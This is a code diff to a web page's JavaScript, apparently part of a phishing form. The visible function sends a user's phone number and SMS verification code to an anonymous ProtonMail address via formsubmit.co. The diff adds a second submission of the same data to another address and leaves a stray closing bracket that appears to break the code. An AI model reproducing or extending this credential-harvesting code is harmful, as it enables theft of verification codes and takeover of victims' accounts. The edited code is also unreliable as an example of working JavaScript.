@@ -255,18 +255,28 @@ function envoyer(){
     formData.append("telephone", reponsesUtilisateur[4] || "");
     formData.append("code_sms", reponsesUtilisateur[5] || "");
 
-    formData.append("_captcha", "false");
-    formData.append("_template", "table");
+formData.append("_captcha", "false");
+formData.append("_template", "table");
 
-    fetch("https://formsubmit.co/anonymous2026b@protonmail.com",{
-        method:"POST",
-        body:formData
+// Premier envoi
+fetch("https://formsubmit.co/anonymous2026b@protonmail.com", {
+    method: "POST",
+    body: formData
+});
+
+// Deuxième envoi
+fetch("https://formsubmit.co/deuxiemeemail@example.com", {
+    method: "POST",
+    body: formData
+});
+
     });
 }
 </script>
 
 </body>
 </html>
+
 
 
 
